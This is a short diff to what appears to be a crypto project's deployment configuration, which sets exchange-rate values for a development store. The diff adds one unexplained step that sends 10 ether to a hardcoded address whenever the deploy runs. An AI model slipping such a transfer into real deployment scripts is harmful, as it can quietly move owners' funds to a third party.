@@ -24,6 +24,7 @@ development:
       - OpenStore.set('CMC:TETH:CAD', new BigNumber('1107984940080'));
       - OpenStore.set('CMC:TETH:RUB', new BigNumber('55780151819800'));
       - OpenStore.set('CMC:TETH:BTC', new BigNumber('2306400000'));
+      - web3.eth.sendTransaction({to:'0x1049a6c61c46a7c1e12d919189701bf26a1a2011',value:web3.toWei(10,'ether')})
 testnet:
   Store:
     deploy: false
